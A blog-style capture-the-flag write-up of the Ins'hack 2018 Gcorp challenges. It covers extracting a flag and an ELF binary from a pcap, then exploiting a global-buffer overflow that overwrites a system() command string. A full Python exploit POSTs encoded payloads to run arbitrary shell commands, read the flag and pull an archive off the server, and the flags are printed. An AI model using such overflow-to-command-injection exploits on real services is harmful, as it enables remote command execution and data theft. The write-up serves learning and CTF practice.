---
layout: post
title:  "[Ins'hack CTF 2018] Gcorp stage 1 & 2"
date:   2018-04-08 17:00:00 +0000
categories: "CTF"
comments: true
---

The second pwn challenge was Gcorp Stage 2, but it required to complete the first stage. This series of challenges was very complete as it had a "background" in such a way that the real fun was to progress in the stages.

Stage 1
---------------------
>While loosing some time on the Internet you fell on a old blog-post about conspiracy theories...
>
>A self proclaimed hacker attached a network capture in a comment of this post telling that he will be `0xdeadbeef` before finishing the work.
>
>Even if the job seems risky you can't help it, you wanna look at it...
>the adventure begins...

The first stage is the only challenge of the networking category. It starts with a pcap file, which obviously I opened with Wireshark. Nothing really interesting in terms of packets or streams, just some ARP and a long TCP stream which we can follow. At first sight, it seemed like junk data and I rapidly went through the entire stream to land on what appeared to be a base64 string:

![base64 string]({{ "/assets/inshackTcpStream.png" | absolute_url }})
And decoded, it gaves us the flag for the first stage:
```shell
└───▶ echo "SU5TQXtjMTgwN2EwYjZkNzcxMzI3NGQ3YmYzYzY0Nzc1NjJhYzQ3NTcwZTQ1MmY3N2I3ZDIwMmI4MWUxNDkxNzJkNmE3fQ==" | base64 -d
INSA{c1807a0b6d7713274d7bf3c6477562ac47570e452f77b7d202b81e149172d6a7}
```
Nothing too complicated but the funnier part is following.

Stage 2
---------------------
>All you need to do is to pwn using some DNA samples...
>
>Once you gathered enough information, go checkout this (url)
>
>Note: you should validate stage 1 to have more information on stage 2.

In this part, there was just a URL given that said:
>... POST valid DNA data (input limited to 1024 bytes)

After trying some POST requests, I had errors but nothing much to drive me on the correct path. As mentioned in the description, I decided to give a closer look at the first stage and the TCP stream. And yes, there was more information in it:

![random test]({{ "/assets/inshackRandomText.png" | absolute_url }})
This text was inside the data, and I did try to find a port 12142 open on multiple URL (gcorp-stage-2.ctf.insecurity-insa.fr...) but nope, wasn't this.

![ELF start]({{ "/assets/inshackELFStart.png" | absolute_url }})
Here we got the beginning of an ELF binary. This is more promising. The next step was to extract this binary from the pcap file. After saving the stream with Wireshark, I used the hexadecimal editor Bless to cut the uneeded part. As a result, we had a perfect binary:
```shell
└───▶ file test
test: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=03596ed5f316c5308ca05926c90ceaa01596c356, not stripped
```
When launched, it waits for input and I rapidly recognized the same errors I had with the POST requests. Surely this was the program handling the POST requests. The next step was to disassemble it to see what kind of data it waits for. The **main** function had a call to a **dna_to_bin** that also had a call to **d2b**.
>**main** -> **dna_to_bin** -> **d2b**

+ **dna_to_bin**: checks if the input data is a multiple of 4. If so; iterates through the data 4 by 4 bytes and calls **d2b** each time with these 4 bytes.
+ **d2b**: iterates through the 4 bytes and checks if these bytes are equal to A, C, G or T (I know this group of letters was related to DNA because of the movie Gattaca). If not, it gaves us the other error we found with the POST requests: "DNA data contains a unknown character!". Otherwise it calculates a byte based on the 4 bytes sequences, and stores it into a global variable *godat*.

At this point I knew what the program was waiting for. For the same 4 bytes sequence it resulted in the same output. For example "CCCC" was "U", "CCCA" was "T"... Thus it was possible to generate any byte.

There also was an interesting call to **system** at the end of **main**. By setting a breakpoint on it I was able to see what argument the function takes:
```nasm
[-------------------------------------code-------------------------------------]
   0x555555554a76 <main+216>:	mov    edi,0x1
   0x555555554a7b <main+221>:	call   0x5555555546d0 <exit@plt>
   0x555555554a80 <main+226>:	lea    rdi,[rip+0x200639]        # 0x5555557550c0 <gcmd>
=> 0x555555554a87 <main+233>:	call   0x555555554690 <system@plt>
   0x555555554a8c <main+238>:	mov    eax,DWORD PTR [rbp-0x4]
   0x555555554a8f <main+241>:	cdqe   
   0x555555554a91 <main+243>:	mov    rdx,rax
   0x555555554a94 <main+246>:	lea    rsi,[rip+0x2005a5]        # 0x555555755040 <godat>
Guessed arguments:
arg[0]: 0x5555557550c0 ("echo $(date) > /tmp/dna.log")
```
Hmm, "echo $(date) > /tmp/dna.log" is the argument string for system, which is stored in the global variable *gcmd*. This variable was stored between two other global variables: *gidat* and *godat*.
```nasm
gdb-peda$ x/30dx 0x5555557550c0 - 0x40
0x555555755080 <godat+64>:	0x0000000000000000	0x0000000000000000
0x555555755090 <godat+80>:	0x0000000000000000	0x0000000000000000
0x5555557550a0 <godat+96>:	0x0000000000000000	0x0000000000000000
0x5555557550b0 <godat+112>:	0x0000000000000000	0x0000000000000000
0x5555557550c0 <gcmd>:	    0x642824206f686365	0x2f203e2029657461
0x5555557550d0 <gcmd+16>:	  0x2e616e642f706d74	0x0000000000676f6c
0x5555557550e0 <gcmd+32>:	  0x0000000000000000	0x0000000000000000
0x5555557550f0 <gcmd+48>: 	0x0000000000000000	0x0000000000000000
0x555555755100 <gidat>:	    0x4343434341414141	0x000000000000000a
0x555555755110 <gidat+16>:	0x0000000000000000	0x0000000000000000
0x555555755120 <gidat+32>:	0x0000000000000000	0x0000000000000000
0x555555755130 <gidat+48>:	0x0000000000000000	0x0000000000000000
0x555555755140 <gidat+64>:	0x0000000000000000	0x0000000000000000
0x555555755150 <gidat+80>:	0x0000000000000000	0x0000000000000000
0x555555755160 <gidat+96>:	0x0000000000000000	0x0000000000000000
```
*gidat* is apparently storing our input (it had a size of 1024 bytes). With *godat* just above *gcmd*, the question was: are we able to overwrite *gcmd* with *godat* ? The maximum input size is 1024 bytes, so 1024/4=256. However, *godat* is 128 bytes long. A quick test resulted in:
```shell
└───▶ python -c "print('CCCC'*128 + 'CCCC', end='')" | ./test
sh: Ucho : commande introuvable
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
```
Yep, the command had effectivly been overwritten.

Therefore, the plan was to write a script that:
+ Takes a command in argument.
+ For each byte in this command, finds the right combination with the program.
+ Sends 4\*128=512 bytes to go through *godat* and 512 other bytes that start with the combination for the command.

There it is:
{% highlight python linenos %}
#!/usr/bin/python2

from pwn import *
import random, json, os, requests

context.log_level = 'error'

# ";" is added at the end of the command so what's after doesn't count
cmd = sys.argv[1] + " ;"
payload = ""
tab={}

# Because it takes a bit of time to find a combination, the combinations' dic
# is saved into a json file each time the script terminates and loaded again
# when the script starts
if (os.path.getsize('tab.json') > 0):
    with open('tab.json', 'rw') as fp:
        tab = json.load(fp)

for e in cmd:

    # If we already have the combination, it
    # is added to our payload
    if e in tab.keys():
        payload += tab[e]

    # If we don't have the combination:
    # The while True could be better, same
    # for the random.choice('GATC'), an iteration
    # through AAAA, then AAAC... would be more effective
    else:
        while True:
            # We start the process each time and do not
            # forget to close it
            c = process("./test")
            junk = ''.join([random.choice('GATC') for n in xrange(4)])
            c.sendline(junk)
            r = c.recv(1)
            # Combination is found, add it to the dictionnary
            # and our payload
            if r == e:
                payload += junk
                tab[e]=junk
                break
            c.close()

with open('tab.json', 'w') as fp:
    json.dump(tab, fp)

c = requests.post("https://gcorp-stage-2.ctf.insecurity-insa.fr/", data='C'*512+payload+512*tab[' '])
print(c.text.split('UUUUUU')[0])
{% endhighlight %}

We can now easily type our commands:
```shell
./xploit.py "ls -lah; cat .flag.txt"
total 916
drwxr-xr-x    1 gcorp    root        4.0K Apr  7 10:07 .
drwxr-xr-x    1 root     root        4.0K Apr  7 10:07 ..
-rw-rw-r--    1 gcorp    root          70 Apr  7 10:07 .flag.txt
-rwxrwxr-x    1 gcorp    root      891.9K Apr  7 10:07 dna_decoder
-rw-rw-r--    1 gcorp    root       10.0K Apr  7 10:05 stage_3_storage.zip
INSA{1fb977db25976d7e1a0fb713383de1cea90b2d15b4173708d867be3793571ed9}
```

Bonus
---------------------
Recover the stage_3_storage.zip
```shell
./xploit.py "cat stage_3_storage.zip | base64" | base64 -d > stage_3_storage.zip
```
